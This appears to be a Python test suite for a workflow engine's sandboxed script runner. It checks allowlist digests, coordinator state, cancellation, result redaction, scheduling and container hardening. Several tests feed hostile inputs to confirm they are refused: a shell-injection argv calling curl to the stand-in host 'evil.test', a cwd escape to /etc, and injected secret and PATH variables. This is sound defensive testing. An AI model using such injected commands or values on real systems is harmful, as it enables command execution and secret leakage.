"""R4C independent-review corrections — adversarial coverage for findings 1–7."""

from __future__ import annotations

import os
import re
from datetime import date
from pathlib import Path

import pytest
import yaml

os.environ["ORCH_TESTING"] = "1"
os.environ.setdefault("DJANGO_SECRET_KEY", "test-only-insecure-secret")
os.environ.setdefault("DJANGO_ALLOWED_HOSTS", "testserver,localhost")
os.environ.setdefault("DJANGO_DEBUG", "0")

pytest.importorskip("django")
pytest.importorskip("rest_framework")

from rest_framework.test import APIClient

from flow_engine.application import ensure_queue, init_project
from flow_engine.application.script_delivery import accept_script_execute
from flow_engine.control_plane.api.views_helpers import set_inprocess_client
from flow_engine.control_plane.bootstrap import (
    bootstrap_test_principals,
    bootstrap_test_token_for,
)
from flow_engine.control_plane.coordinator_client import CoordinatorClient
from flow_engine.coordinator.commands import CommandContext, RuntimeCommand
from flow_engine.coordinator.coordinator import (
    FRESH_OBSERVATION_COMMANDS,
    StateCoordinator,
)
from flow_engine.domain.errors import (
    AuthzDeniedError,
    BudgetExhaustedError,
    ConflictError,
    UnsupportedSurfaceError,
    ValidationFailedError,
)
from flow_engine.domain.states import PrincipalRole, Surface
from flow_engine.mcp_lanes.catalog import principal_key_for_lane
from flow_engine.persistence import Kernel
from flow_engine.persistence.transactions import transaction
from flow_engine.schedules.service import (
    assert_planned_time_matches_cadence,
    claim_schedule_tick,
    complete_schedule_run,
    planned_times_for_day,
)
from flow_engine.schedules.templates import (
    SCHEDULE_TIMEZONE,
    get_schedule_template,
    list_schedule_templates,
    require_schedule_template,
)
from flow_engine.script_sandbox.allowlist import (
    GENERIC_SCRIPT_IDS,
    ORCH_SCRIPT_EXECUTABLE_DIGEST,
    SCRIPT_WORKER_IMAGE_DIGEST,
    get_allowlist_entry,
    list_allowlist,
)
from flow_engine.script_sandbox.classify import (
    ScriptClass,
    classify_script,
    reject_repository_script,
)
from flow_engine.script_sandbox.effects import assert_allowed_effects
from flow_engine.script_sandbox.pins import assert_valid_sha256_digest
from flow_engine.script_sandbox.registry import (
    cancel_script_execution,
    complete_script_execution,
    get_script_execution,
    register_script_execution,
    start_script_execution,
)
from flow_engine.script_sandbox.results_schema import validate_and_redact_script_results
from flow_engine.script_sandbox.runner import (
    ScriptRunRequest,
    _InternalTestHooks,
    run_allowlisted_script,
    set_testing_hooks,
)
from flow_engine.workers.celery_app import app as celery_app
from flow_engine.workers.tasks import reject_repository_script_task

_SHA256_RE = re.compile(r"^sha256:[0-9a-f]{64}$")


@pytest.fixture
def r4c_api(tmp_path):
    import django
    from django.apps import apps
    from django.conf import settings

    os.environ["ORCH_TESTING"] = "1"
    if not settings.configured:
        os.environ.setdefault(
            "DJANGO_SETTINGS_MODULE", "flow_engine.control_plane.settings"
        )
    if not apps.ready:
        django.setup()

    kernel = Kernel.init(tmp_path / "r4c.db")
    with transaction(kernel.connection):
        init_project(kernel.connection, name="demo")
        ensure_queue(kernel.connection, name="default")
        bootstrap_test_principals(kernel.connection)
    client = CoordinatorClient.from_inprocess(kernel)
    set_inprocess_client(client)
    api = APIClient()
    yield api, kernel
    set_inprocess_client(None)
    set_testing_hooks(None)
    kernel.close()


def _auth(api: APIClient, principal: str) -> None:
    api.credentials(HTTP_AUTHORIZATION=f"Bearer {bootstrap_test_token_for(principal)}")


def _ctx(principal: str = "founder") -> CommandContext:
    return CommandContext(
        principal_id=principal,
        role=PrincipalRole.FOUNDER if principal == "founder" else PrincipalRole.SYSTEM,
        surface=Surface.REST if principal != "scheduler" else Surface.SCHEDULE,
        grant=None,
    )


def _worker_ctx() -> CommandContext:
    return CommandContext(
        principal_id="worker",
        role=PrincipalRole.WORKER,
        surface=Surface.WORKER,
        grant=None,
    )


def test_script_show_without_key_is_fresh_but_mutations_remain_idempotent(
    r4c_api,
) -> None:
    _api, kernel = r4c_api
    entry = get_allowlist_entry("script.generic.repository_health")
    assert entry is not None
    with transaction(kernel.connection):
        registered = register_script_execution(
            kernel.connection,
            script_id=entry.script_id,
            actor="founder",
            input_json={},
            idempotency_key="fresh-script-show-fixture",
        )
    execution_id = registered["execution"]["id"]
    coord = StateCoordinator(kernel.connection)

    with transaction(kernel.connection):
        first = coord.accept(
            RuntimeCommand(
                command_type="script.show",
                target_id=execution_id,
                payload={"execution_id": execution_id},
                context=_ctx(),
            )
        )
    assert first["result"]["execution"]["status"] == "registered"
    assert first["from_cache"] is False

    with transaction(kernel.connection):
        complete_script_execution(
            kernel.connection,
            execution_id=execution_id,
            actor="worker",
            result={
                "script_id": entry.script_id,
                "status": "complete",
                "argv": list(entry.argv),
                "executable_digest": entry.executable_digest,
                "image_digest": entry.image_digest,
                "output": {
                    "script_id": entry.script_id,
                    "status": "complete",
                    "effects": [],
                },
                "redacted_output": "",
                "error_code": None,
                "error": None,
                "bounded": True,
                "network_attempted": False,
                "hardening": {},
                "pgid": None,
            },
        )
        second = coord.accept(
            RuntimeCommand(
                command_type="script.show",
                target_id=execution_id,
                payload={"execution_id": execution_id},
                context=_ctx(),
            )
        )
    assert second["result"]["execution"]["status"] == "complete"
    assert second["from_cache"] is False

    explicit = RuntimeCommand(
        command_type="script.show",
        target_id=execution_id,
        payload={"execution_id": execution_id},
        idempotency_key="explicit-snapshot",
        context=_ctx(),
    )
    with transaction(kernel.connection):
        pinned = coord.accept(explicit)
        kernel.connection.execute(
            "UPDATE script_executions SET status = 'failed' WHERE id = ?",
            (execution_id,),
        )
        replay = coord.accept(explicit)
    assert pinned["result"]["execution"]["status"] == "complete"
    assert replay["result"]["execution"]["status"] == "complete"
    assert replay["from_cache"] is True

    assert "script.show" in FRESH_OBSERVATION_COMMANDS
    assert not {
        "runtime.run",
        "runtime.worker_deliver",
        "script.register",
        "script.start",
        "script.complete",
        "script.cancel",
        "schedule.tick",
        "delegation.dispatch",
    } & FRESH_OBSERVATION_COMMANDS


# --- Finding 3: valid digests -------------------------------------------------


def test_allowlist_has_exactly_twelve_generics_with_valid_digests() -> None:
    assert len(GENERIC_SCRIPT_IDS) == 12
    assert len(list_allowlist()) == 12
    assert _SHA256_RE.fullmatch(SCRIPT_WORKER_IMAGE_DIGEST)
    assert _SHA256_RE.fullmatch(ORCH_SCRIPT_EXECUTABLE_DIGEST)
    assert "r4c-script-worker-local" not in SCRIPT_WORKER_IMAGE_DIGEST
    for script_id in GENERIC_SCRIPT_IDS:
        entry = get_allowlist_entry(script_id)
        assert entry is not None
        assert entry.argv_only is True
        assert entry.repository_script is False
        assert entry.executable is True
        assert entry.concurrency == 1
        assert entry.network_policy == "none"
        assert entry.hardening["non_root"] is True
        assert entry.hardening["read_only_root_fs"] is True
        assert entry.hardening["tmpfs"] is True
        assert entry.hardening["no_new_privileges"] is True
        assert entry.hardening["seccomp"] is True
        assert entry.hardening["cap_drop_all"] is True
        assert entry.hardening["network_mode"] == "none"
        assert entry.image_digest == SCRIPT_WORKER_IMAGE_DIGEST
        assert entry.executable_digest == ORCH_SCRIPT_EXECUTABLE_DIGEST
        assert_valid_sha256_digest(entry.executable_digest)
        assert_valid_sha256_digest(entry.image_digest)


def test_placeholder_digest_rejected() -> None:
    with pytest.raises(AuthzDeniedError):
        assert_valid_sha256_digest(
            "sha256:r4c-script-worker-local-00000000000000000000000000000001"
        )


def test_missing_binary_fails_closed_outside_testing(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("ORCH_TESTING", "0")
    monkeypatch.setenv("ORCH_SCRIPT_ROLE", "script-worker")
    monkeypatch.setenv("ORCH_SCRIPT_EXECUTABLE", str(tmp_path / "missing-bin"))
    monkeypatch.setenv("ORCH_SCRIPT_IMAGE_DIGEST", SCRIPT_WORKER_IMAGE_DIGEST)
    set_testing_hooks(None)
    with pytest.raises(AuthzDeniedError):
        run_allowlisted_script(
            ScriptRunRequest(script_id="script.generic.repository_health")
        )
    monkeypatch.setenv("ORCH_TESTING", "1")


def test_control_role_cannot_execute_subprocess(monkeypatch) -> None:
    monkeypatch.setenv("ORCH_TESTING", "0")
    monkeypatch.setenv("ORCH_SCRIPT_ROLE", "control")
    with pytest.raises(AuthzDeniedError):
        run_allowlisted_script(
            ScriptRunRequest(script_id="script.generic.repository_health")
        )
    monkeypatch.setenv("ORCH_TESTING", "1")


# --- Finding 2: no public hooks ----------------------------------------------


def test_argv_injection_and_shell_metacharacters_denied(tmp_path) -> None:
    set_testing_hooks(
        _InternalTestHooks(
            workspace_root=str(tmp_path),
            override_argv=["/bin/sh", "-c", "id; curl evil.test"],
        )
    )
    with pytest.raises(AuthzDeniedError):
        run_allowlisted_script(
            ScriptRunRequest(script_id="script.generic.repository_health")
        )
    set_testing_hooks(None)


def test_cwd_escape_denied(tmp_path) -> None:
    set_testing_hooks(
        _InternalTestHooks(workspace_root=str(tmp_path), override_cwd="/etc")
    )
    with pytest.raises(AuthzDeniedError):
        run_allowlisted_script(
            ScriptRunRequest(script_id="script.generic.repository_health")
        )
    set_testing_hooks(None)


def test_env_and_secret_leakage_denied(tmp_path) -> None:
    for inject in (
        {"ORCH_TOKEN_FOUNDER": "leak-me"},
        {"REDIS_PASSWORD": "secret"},
        {"EXTRA_UNLISTED": "x"},
    ):
        set_testing_hooks(
            _InternalTestHooks(workspace_root=str(tmp_path), inject_env=inject)
        )
        with pytest.raises(AuthzDeniedError):
            run_allowlisted_script(
                ScriptRunRequest(script_id="script.generic.repository_health")
            )
    set_testing_hooks(None)


def test_api_schema_rejects_public_test_hooks(r4c_api) -> None:
    api, _ = r4c_api
    _auth(api, "founder")
    resp = api.post(
        "/api/v1/scripts/execute",
        {
            "script_id": "script.generic.repository_health",
            "idempotency_key": "hook-1",
            "workspace_root": "/tmp/evil",
            "simulate_network": True,
            "force_timeout": True,
            "inject_env": {"PATH": "/evil"},
            "override_argv": ["/bin/sh"],
            "override_cwd": "/etc",
        },
        format="json",
    )
    assert resp.status_code == 400



def test_digest_mismatch_denied(tmp_path) -> None:
    set_testing_hooks(_InternalTestHooks(workspace_root=str(tmp_path)))
    with pytest.raises(AuthzDeniedError):
        run_allowlisted_script(
            ScriptRunRequest(
                script_id="script.generic.repository_health",
                expected_executable_digest="sha256:" + ("ab" * 32),
            )
        )
    with pytest.raises(AuthzDeniedError):
        run_allowlisted_script(
            ScriptRunRequest(
                script_id="script.generic.repository_health",
                expected_image_digest="sha256:" + ("cd" * 32),
            )
        )
    set_testing_hooks(None)


def test_output_cap_and_timeout_and_network_via_internal_hooks(tmp_path) -> None:
    set_testing_hooks(
        _InternalTestHooks(workspace_root=str(tmp_path), force_timeout=True)
    )
    timed = run_allowlisted_script(
        ScriptRunRequest(script_id="script.generic.repository_health")
    )
    assert timed.status == "timeout"

    set_testing_hooks(
        _InternalTestHooks(workspace_root=str(tmp_path), simulate_network=True)
    )
    net = run_allowlisted_script(
        ScriptRunRequest(script_id="script.generic.repository_health")
    )
    assert net.status == "rejected"
    assert net.network_attempted is True
    assert net.error_code == "AUTHZ_DENIED"

    set_testing_hooks(_InternalTestHooks(workspace_root=str(tmp_path)))
    ok = run_allowlisted_script(
        ScriptRunRequest(
            script_id="script.generic.catalog_integrity_sweep",
            input_json={"scope": "agentic", "dry_run": True},
        )
    )
    assert ok.status == "complete"
    assert ok.bounded is True
    assert ok.hardening["non_root"] is True
    set_testing_hooks(None)


# --- Finding 1: coordinator state-only; worker executes ----------------------


def test_coordinator_accept_refuses_inline_script_execute(tmp_path) -> None:
    kernel = Kernel.init(tmp_path / "coord.db")
    try:
        with transaction(kernel.connection):
            bootstrap_test_principals(kernel.connection)
            registered = register_script_execution(
                kernel.connection,
                script_id="script.generic.repository_health",
                actor="founder",
                idempotency_key="inline-1",
                input_json={"dry_run": True},
            )
            execution_id = registered["execution"]["id"]
        coord = StateCoordinator(kernel.connection)
        with transaction(kernel.connection):
            envelope = coord.accept(
                RuntimeCommand(
                    command_type="script.execute",
                    target_id=execution_id,
                    payload={"execution_id": execution_id},
                    idempotency_key=f"bad-inline|{execution_id}",
                    context=_ctx("founder"),
                )
            )
        assert envelope["status"] == "rejected"
        assert "outside SQLite" in (envelope.get("error") or "")
    finally:
        kernel.close()


def test_accept_script_execute_outside_transaction(tmp_path) -> None:
    set_testing_hooks(_InternalTestHooks(workspace_root=str(tmp_path / "ws")))
    kernel = Kernel.init(tmp_path / "deliv.db")
    try:
        with transaction(kernel.connection):
            bootstrap_test_principals(kernel.connection)
            registered = register_script_execution(
                kernel.connection,
                script_id="script.generic.repository_health",
                actor="founder",
                idempotency_key="deliv-1",
                input_json={"dry_run": True},
            )
            execution_id = registered["execution"]["id"]
        coord = StateCoordinator(kernel.connection)
        envelope = accept_script_execute(
            coord,
            RuntimeCommand(
                command_type="script.execute",
                target_id=execution_id,
                payload={"execution_id": execution_id},
                idempotency_key=f"exec|{execution_id}",
                context=_worker_ctx(),
            ),
        )
        assert envelope["status"] == "applied"
        assert envelope["result"]["result"]["status"] == "complete"
    finally:
        set_testing_hooks(None)
        kernel.close()


def test_durable_cancel_observable_before_and_during(tmp_path) -> None:
    kernel = Kernel.init(tmp_path / "cancel.db")
    try:
        with transaction(kernel.connection):
            bootstrap_test_principals(kernel.connection)
            registered = register_script_execution(
                kernel.connection,
                script_id="script.generic.repository_health",
                actor="founder",
                idempotency_key="cancel-1",
            )
            execution_id = registered["execution"]["id"]
            cancelled = cancel_script_execution(
                kernel.connection, execution_id=execution_id, actor="founder"
            )
            assert cancelled["cancel_requested"] is True
            assert cancelled["execution"]["status"] == "cancelled"
            assert cancelled["execution"]["cancel_requested"] is True

            registered2 = register_script_execution(
                kernel.connection,
                script_id="script.generic.git_diff_summary",
                actor="founder",
                idempotency_key="cancel-2",
            )
            eid2 = registered2["execution"]["id"]
            start_script_execution(
                kernel.connection, execution_id=eid2, actor="worker"
            )
            cancel_script_execution(
                kernel.connection, execution_id=eid2, actor="founder"
            )
            row = get_script_execution(kernel.connection, eid2)
            assert row["cancel_requested"] is True
            assert row["status"] == "running"
    finally:
        kernel.close()


def test_cancel_wins_over_complete_and_failed_at_settlement(tmp_path) -> None:
    kernel = Kernel.init(tmp_path / "cancel-settle.db")
    try:
        with transaction(kernel.connection):
            bootstrap_test_principals(kernel.connection)
            for key, reported in (("settle-complete", "complete"), ("settle-failed", "failed")):
                registered = register_script_execution(
                    kernel.connection,
                    script_id="script.generic.repository_health",
                    actor="founder",
                    idempotency_key=key,
                )
                eid = registered["execution"]["id"]
                start_script_execution(
                    kernel.connection, execution_id=eid, actor="worker"
                )
                cancel_script_execution(
                    kernel.connection, execution_id=eid, actor="founder"
                )
                entry = get_allowlist_entry("script.generic.repository_health")
                assert entry is not None
                completed = complete_script_execution(
                    kernel.connection,
                    execution_id=eid,
                    actor="worker",
                    result={
                        "script_id": entry.script_id,
                        "status": reported,
                        "argv": list(entry.argv),
                        "executable_digest": entry.executable_digest,
                        "image_digest": entry.image_digest,
                        "output": {"script_id": entry.script_id, "status": reported, "effects": []},
                        "redacted_output": "",
                        "error_code": None if reported == "complete" else "VALIDATION_FAILED",
                        "error": None if reported == "complete" else "boom",
                        "bounded": True,
                        "network_attempted": False,
                        "hardening": {},
                        "pgid": None,
                    },
                )
                assert completed["execution"]["status"] == "cancelled"
                assert completed["result"]["status"] == "cancelled"
    finally:
        kernel.close()


# --- Finding 5: script_results schema ----------------------------------------


def test_forbidden_effects_rejected() -> None:
    with pytest.raises(UnsupportedSurfaceError):
        assert_allowed_effects([{"type": "remediation"}])
    with pytest.raises(UnsupportedSurfaceError):
        assert_allowed_effects([{"type": "provider_call"}])
    with pytest.raises(UnsupportedSurfaceError):
        assert_allowed_effects([{"type": "repository_mutation"}])
    assert_allowed_effects(
        [
            {"type": "evidence", "summary": "ok"},
            {"type": "finding", "summary": "note", "severity": "low"},
            {"type": "anomaly", "summary": "a5"},
            {"type": "follow_up_work_candidate", "summary": "candidate"},
        ]
    )


def test_script_results_reject_secrets_and_forbidden_claims() -> None:
    with pytest.raises(UnsupportedSurfaceError):
        validate_and_redact_script_results(
            [
                {
                    "script_id": "script.generic.repository_health",
                    "status": "complete",
                    "remediation": True,
                }
            ]
        )
    with pytest.raises(UnsupportedSurfaceError):
        validate_and_redact_script_results(
            [
                {
                    "script_id": "script.generic.repository_health",
                    "status": "complete",
                    "provider_calls": 1,
                }
            ]
        )
    cleaned = validate_and_redact_script_results(
        [
            {
                "script_id": "script.generic.repository_health",
                "status": "complete",
                "summary": "token=supersecret value",
                "effects": [{"type": "evidence", "summary": "ok"}],
            }
        ]
    )
    assert "[REDACTED]" in cleaned[0]["summary"]


# --- Finding 6: schedules / beat ---------------------------------------------


def test_schedule_templates_asia_manila() -> None:
    templates = list_schedule_templates()
    assert len(templates) == 7
    assert all(t["timezone"] == SCHEDULE_TIMEZONE for t in templates)
    assert all(t["provider_call_budget"] == 0 for t in templates)
    assert all(t["concurrency"] == 1 for t in templates)
    assert all(t["no_overlap"] is True for t in templates)
    assert all(t["findings_evidence_only"] is True for t in templates)
    backup = get_schedule_template("schedule.manila.weekly.backup_restore")
    assert backup is not None
    assert backup.timeout_sec == 1800
    skill = get_schedule_template("schedule.manila.weekly.skill_gap_proposal")
    assert skill is not None
    assert skill.mode == "follow_up_candidate_only"
    assert skill.script_ids == ()


def test_beat_schedule_has_all_seven_templates() -> None:
    beat = celery_app.conf.beat_schedule or {}
    ids = {t["schedule_id"] for t in list_schedule_templates()}
    assert ids <= set(beat.keys())
    assert len(ids) == 7
    for schedule_id in ids:
        entry = beat[schedule_id]
        assert entry["task"] == "flow_engine.workers.schedule_template_tick"
        assert entry["kwargs"]["schedule_id"] == schedule_id
        assert entry["options"]["queue"] == "scheduler"


def test_schedule_timezone_planned_times() -> None:
    daily = require_schedule_template("schedule.manila.daily.catalog_governance")
    monday = date(2026, 7, 27)
    times = planned_times_for_day(daily, day=monday)
    assert len(times) == 1
    assert "01:30" in times[0]
    assert times[0].endswith("+08:00")
    assert_planned_time_matches_cadence(daily, times[0])

    weekly = require_schedule_template("schedule.manila.weekly.dependency_inventory")
    assert planned_times_for_day(weekly, day=monday)
    assert not planned_times_for_day(weekly, day=date(2026, 7, 28))

    with pytest.raises(ValidationFailedError):
        assert_planned_time_matches_cadence(daily, "2026-07-27T01:31:00+08:00")


def test_schedule_dedupe_overlap_budget_remediation(tmp_path) -> None:
    kernel = Kernel.init(tmp_path / "sched.db")
    try:
        with transaction(kernel.connection):
            init_project(kernel.connection, name="demo")
            planned = "2026-07-27T01:30:00+08:00"
            first = claim_schedule_tick(
                kernel.connection,
                schedule_id="schedule.manila.daily.catalog_governance",
                planned_time=planned,
                actor="scheduler",
            )
            assert first["deduped"] is False
            second = claim_schedule_tick(
                kernel.connection,
                schedule_id="schedule.manila.daily.catalog_governance",
                planned_time=planned,
                actor="scheduler",
            )
            assert second["deduped"] is True

            with pytest.raises(ConflictError):
                claim_schedule_tick(
                    kernel.connection,
                    schedule_id="schedule.manila.daily.documentation",
                    planned_time="2026-07-27T02:00:00+08:00",
                    actor="scheduler",
                )

            with pytest.raises(BudgetExhaustedError):
                claim_schedule_tick(
                    kernel.connection,
                    schedule_id="schedule.manila.daily.stale_work",
                    planned_time="2026-07-27T02:30:00+08:00",
                    actor="scheduler",
                    provider_call_budget=1,
                )

            run_id = first["run"]["id"]
            with pytest.raises(UnsupportedSurfaceError):
                complete_schedule_run(
                    kernel.connection,
                    run_id=run_id,
                    actor="scheduler",
                    attempt_remediation=True,
                )
            with pytest.raises(AuthzDeniedError):
                complete_schedule_run(
                    kernel.connection,
                    run_id=run_id,
                    actor="worker-other",
                    actor_role="worker",
                    effects=[{"type": "evidence", "summary": "forged"}],
                )
            done = complete_schedule_run(
                kernel.connection,
                run_id=run_id,
                actor="scheduler",
                effects=[
                    {"type": "evidence", "summary": "catalog ok", "uri": "orch://e/1"},
                    {"type": "finding", "summary": "minor", "severity": "low"},
                    {"type": "follow_up_work_candidate", "summary": "review drift"},
                ],
                script_results=[
                    {
                        "script_id": "script.generic.catalog_integrity_sweep",
                        "status": "complete",
                        "summary": "ok",
                        "effects": [{"type": "evidence", "summary": "e"}],
                    }
                ],
            )
            assert done["run"]["status"] == "complete"
            assert done["result"]["provider_calls"] == 0
            assert done["result"]["remediation"] is False
    finally:
        kernel.close()


# --- Surfaces -----------------------------------------------------------------


def test_repository_script_rejected_by_classifier() -> None:
    assert classify_script("script.repository.custom_hook") == ScriptClass.REPOSITORY_CATALOG_ONLY
    with pytest.raises(UnsupportedSurfaceError):
        reject_repository_script("script.repository.custom_hook")
    with pytest.raises(ValidationFailedError):
        reject_repository_script("not-a-script")


def test_api_rejects_repository_script(r4c_api, monkeypatch) -> None:
    api, _ = r4c_api
    from flow_engine.workers.tasks import execute_registered_script

    queued: list[dict] = []
    monkeypatch.setattr(
        execute_registered_script,
        "delay",
        lambda **kwargs: queued.append(kwargs),
    )
    _auth(api, "founder")
    resp = api.post(
        "/api/v1/scripts/execute",
        {"script_id": "script.repository.custom_hook", "idempotency_key": "api-repo-1"},
        format="json",
    )
    assert resp.status_code in {200, 202, 403, 400}
    body = resp.json()
    assert body.get("status") == "rejected" or body.get("error_code") in {
        "UNSUPPORTED_SURFACE",
        "VALIDATION_FAILED",
        "AUTHZ_DENIED",
    }
    assert queued == []


def test_api_executes_allowlisted_script(r4c_api, tmp_path) -> None:
    set_testing_hooks(_InternalTestHooks(workspace_root=str(tmp_path / "ws")))
    api, _ = r4c_api
    _auth(api, "founder")
    entry = get_allowlist_entry("script.generic.git_diff_summary")
    assert entry is not None
    resp = api.post(
        "/api/v1/scripts/execute",
        {
            "script_id": entry.script_id,
            "idempotency_key": "api-gen-1",
            "input": {"dry_run": True},
            "expected_executable_digest": entry.executable_digest,
            "expected_image_digest": entry.image_digest,
        },
        format="json",
    )
    assert resp.status_code in {200, 202}
    body = resp.json()
    assert body["status"] == "applied"
    assert body["result"]["result"]["status"] == "complete"
    set_testing_hooks(None)


def test_celery_rejects_repository_script() -> None:
    out = reject_repository_script_task(script_id="script.repository.custom_hook")
    assert out["status"] == "rejected"
    assert out["executable"] is False


def test_schedule_api_and_mcp_surfaces(r4c_api) -> None:
    api, _ = r4c_api
    _auth(api, "scheduler")
    templates = api.get("/api/v1/schedules/templates")
    assert templates.status_code in {200, 202}
    assert templates.json()["result"]["timezone"] == "Asia/Manila"

    tick = api.post(
        "/api/v1/schedules/tick",
        {
            "schedule_id": "schedule.manila.weekly.skill_gap_proposal",
            "planned_time": "2026-07-29T03:00:00+08:00",
            "provider_call_budget": 0,
        },
        format="json",
    )
    assert tick.status_code in {200, 202}
    run_id = tick.json()["result"]["run"]["id"]
    complete = api.post(
        "/api/v1/schedules/complete",
        {"run_id": run_id, "effects": []},
        format="json",
    )
    assert complete.status_code in {200, 202}
    assert complete.json()["result"]["result"]["remediation"] is False

    api.credentials(
        HTTP_AUTHORIZATION=f"Bearer {bootstrap_test_token_for('founder')}",
        HTTP_X_ORCHESTRATOR_MCP_SERVICE_TOKEN=bootstrap_test_token_for(
            principal_key_for_lane("maintenance")
        ),
        HTTP_X_ORCHESTRATOR_MCP_LANE_ID="maintenance",
    )
    mcp = api.post(
        "/api/v1/mcp/lanes/maintenance/tools/invoke",
        {
            "tool": "registered_check_execution",
            "arguments": {"script_id": "script.repository.custom_hook"},
        },
        format="json",
    )
    assert mcp.status_code == 200
    assert mcp.json()["status"] == "rejected"

    status = api.post(
        "/api/v1/mcp/lanes/maintenance/tools/invoke",
        {"tool": "schedule_status_run", "arguments": {}},
        format="json",
    )
    assert status.status_code == 200
    assert status.json()["result"]["activation_available"] is False
    assert status.json()["result"]["provider_call_budget"] == 0


def test_coordinator_rejects_repo_script_command(tmp_path) -> None:
    kernel = Kernel.init(tmp_path / "coord.db")
    try:
        with transaction(kernel.connection):
            bootstrap_test_principals(kernel.connection)
        coord = StateCoordinator(kernel.connection)
        envelope = coord.accept(
            RuntimeCommand(
                command_type="script.register",
                target_id="script.repository.custom_hook",
                payload={
                    "script_id": "script.repository.custom_hook",
                    "idempotency_key": "coord-repo-1",
                },
                idempotency_key="coord-repo-1",
                context=_ctx("founder"),
            )
        )
        assert envelope["status"] == "rejected"
        assert envelope["error_code"] == "UNSUPPORTED_SURFACE"
    finally:
        kernel.close()


# --- Finding 7: compose duplicate keys + hardening ---------------------------


class _NoDuplicateKeyLoader(yaml.SafeLoader):
    pass


def _no_duplicates(loader, node, deep=False):
    explicit_keys = set()
    for key_node, _value_node in node.value:
        if key_node.tag == "tag:yaml.org,2002:merge":
            continue
        key = loader.construct_object(key_node, deep=deep)
        if key in explicit_keys:
            raise yaml.constructor.ConstructorError(
                "while constructing a mapping",
                node.start_mark,
                f"found duplicate key: {key!r}",
                key_node.start_mark,
            )
        explicit_keys.add(key)
    loader.flatten_mapping(node)
    return yaml.SafeLoader.construct_mapping(loader, node, deep=deep)


_NoDuplicateKeyLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _no_duplicates
)


def test_compose_no_duplicate_keys_strict() -> None:
    compose_path = Path(__file__).resolve().parents[2] / "docker-compose.yml"
    text = compose_path.read_text(encoding="utf-8")
    # Strict duplicate-key load (does not expand merge keys as duplicates).
    yaml.load(text, Loader=_NoDuplicateKeyLoader)


def test_compose_hardening_markers_present() -> None:
    root = Path(__file__).resolve().parents[2]
    compose = (root / "docker-compose.yml").read_text(encoding="utf-8")
    assert "script-worker:" in compose
    assert "script-runner:" in compose
    assert "network_mode: \"none\"" in compose or "network_mode: 'none'" in compose
    assert "script-spool:" in compose
    assert "scheduler:" in compose
    assert "read_only: true" in compose
    assert "cap_drop:" in compose
    assert "no-new-privileges:true" in compose
    assert "Asia/Manila" in compose or "TZ: Asia/Manila" in compose
    assert "seccomp=./deploy/seccomp/script-worker.json" in compose
    assert "ORCH_SCRIPT_ROLE: control" in compose
    assert "ORCH_SCRIPT_ROLE: script-worker" in compose
    assert "ORCH_SCRIPT_ROLE: script-runner" in compose
    # No placeholder digest string.
    assert "r4c-script-worker-local" not in compose
    dockerfile = (root / "Dockerfile").read_text(encoding="utf-8")
    assert "ORCH_SCRIPT_ROLE=script-worker" in dockerfile
    assert "ORCH_SCRIPT_ROLE=script-runner" in dockerfile
    assert "ORCH_SCRIPT_ROLE=control" in dockerfile
    assert "-B" in dockerfile  # Celery Beat embedded in scheduler
    assert "pinned_script_worker_image_digest" not in (
        root / "src/flow_engine/script_sandbox/pins.py"
    ).read_text(encoding="utf-8")
    for scratch in (
        root / "deploy/pins/_digests.ipynb",
        root / "deploy/pins/_run_digests.py",
    ):
        if scratch.exists():
            assert "REMOVED" in scratch.read_text(encoding="utf-8", errors="replace")
